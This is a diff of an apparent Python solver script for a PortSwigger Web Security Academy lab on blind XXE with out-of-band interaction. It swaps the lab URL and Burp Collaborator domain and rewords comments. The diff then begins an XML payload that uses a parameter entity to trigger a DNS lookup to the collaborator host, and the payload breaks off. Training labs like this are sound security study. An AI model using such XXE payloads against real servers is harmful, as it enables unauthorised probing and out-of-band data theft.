@@ -6,8 +6,8 @@
 #
 # Lab: Blind XXE with out-of-band interaction
 #
-# Steps: 1. Inject payload into 'productId' XML element to issue a DNS lookup to
-#           burp collaborator using a parameter entity
+# Steps: 1. Inject payload into the XML-based check stock request to issue a DNS lookup
+#           to burp collaborator using a parameter entity
 #        2. Check your burp collaborator for the DNS lookup
 #
 #########################################################################################
@@ -24,12 +24,12 @@ from colorama import Fore
 #########
 
 # change this to your lab URL
-url = "https://0a6a00e5031388ac82c6ec31006800af.web-security-academy.net"
+url = "https://0a04004e046474d085a5285d00d200ae.web-security-academy.net"
 
 # change this to your collaborator domain
-collaborator = "eq848lnu29qau5i8oiea08q66xco0ko9.oastify.com"
+collaborator = "izl88khabjj64osyr796897ai1oscq0f.oastify.com"
 
-print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "productId")
+print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "XML-based check stock request")
 
 # payload to issue a DNS lookup to burp collaborator using a parameter entity
 payload = f"""<?xml version="1.0" encoding="UTF-8"?>
